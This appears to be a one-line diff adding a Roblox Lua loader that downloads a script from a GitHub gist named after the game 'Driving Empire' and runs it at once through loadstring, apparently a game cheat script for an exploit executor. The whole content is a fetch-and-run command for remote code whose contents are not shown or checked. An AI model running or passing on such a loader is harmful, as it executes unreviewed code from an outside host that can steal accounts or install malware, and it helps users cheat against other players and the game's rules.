@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/Dustin21335/1f425ca6654f39c66841452ef1ab6e55/raw/48328779ed82e4f490555204ca1014e2dbf281f9/Roblox%2520%255BCLASSIC%255D%2520Driving%2520Empire%2520%25F0%259F%258F%258E%25EF%25B8%258F%2520Car%2520Racing"))()
